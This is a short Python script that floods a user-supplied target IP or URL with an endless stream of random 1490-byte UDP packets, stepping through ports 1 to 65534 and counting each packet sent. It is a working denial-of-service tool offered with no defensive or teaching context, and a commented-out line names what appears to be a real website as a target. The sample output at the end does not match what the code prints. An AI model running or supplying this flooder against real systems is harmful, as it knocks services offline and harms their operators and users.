
import time
import socket
import random
from datetime import datetime

def getIP(site):
  try:
    site = socket.gethostbyname(site)
  except:
    site = socket.gethostbyname(site.split('/')[2])
  # return f'https://{site}/'
  return site

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

# site = 'https://onlineforms.in/'
site = input("IP/URL Target : ")
ip = getIP(site)

sent = 0
port = 5000

print ("Starting in 5 seconds.")
time.sleep(5)

while True:
  sock.sendto(bytes, (ip,port))
  sent = sent + 1
  port = port + 1
  print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
  if port == 65534:
    port = 1


# Output:

'''
IP Target : 127.0.0.1
Port : 5000
'''
